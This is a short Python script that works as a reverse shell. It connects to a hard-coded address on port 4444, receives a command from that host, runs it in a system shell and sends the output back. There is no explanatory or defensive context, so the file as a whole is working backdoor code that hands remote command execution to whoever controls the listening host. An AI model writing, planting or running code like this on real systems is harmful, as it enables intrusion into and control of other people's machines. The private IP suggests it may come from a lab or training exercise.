#!/usr/bin/env python
import socket
import  subprocess

def execute_system_commands(command):
    return subprocess.check_output(command, shell=True)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.184.151",4444))
s.send("\n[+] Connection Established\n")

command = s.recv(1024)
command_result = execute_system_commands(command)
s.send(command_result)

s.close()

